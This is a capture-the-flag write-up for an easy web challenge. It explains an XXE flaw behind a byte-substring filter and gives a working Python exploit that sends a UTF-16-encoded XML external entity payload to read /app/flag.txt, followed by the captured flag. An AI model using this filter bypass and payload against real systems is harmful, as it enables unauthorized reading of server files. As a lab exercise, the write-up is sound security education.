# Meters Flag

- **Lab / Category:** Web
- **Points:** 80
- **Difficulty:** easy
- **Challenge ID:** `ae2308ab-85d4-4821-a607-d8b9ebe6f5c4`
- **Status:** ✅ SOLVED

## Vulnerability — XXE (external entity) with an encoding-bypassable filter
`metersflag.py` parses POSTed XML with `etree.XMLParser(resolve_entities=True)` and
reflects `weight`/`height` back in the response. It tries to block XXE with a **raw-byte**
filter:

```python
if b"<!DOCTYPE" in xml_data or b"+ADwAIQ-ENTITY" in xml_data:
    return "I'm watching you *-*"
```

It only blocks the ASCII bytes of `<!DOCTYPE` and the UTF-7 form. Sending the document in
**UTF-16** changes every byte, so the substring check misses it, while lxml still honours the
`encoding="UTF-16"` declaration and resolves the entity.

## Exploit
```python
import requests
B="http://<instance>.playat.flagyard.com"
xml = ('<?xml version="1.0" encoding="UTF-16"?>'
       '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>'
       '<data><weight>&xxe;</weight><height>100</height></data>')
r = requests.post(B+"/", data=xml.encode("utf-16"),
                  headers={"Content-Type":"application/xml"})
print(r.text)   # entity resolves inside <weight>...</weight>
```

The entity `&xxe;` (contents of `/app/flag.txt`) is reflected in the `<weight>` element.

## Flag
`FlagY{4607d6a58e2306d497a2db887faff6e0}`

_Submission: ACCEPTED._
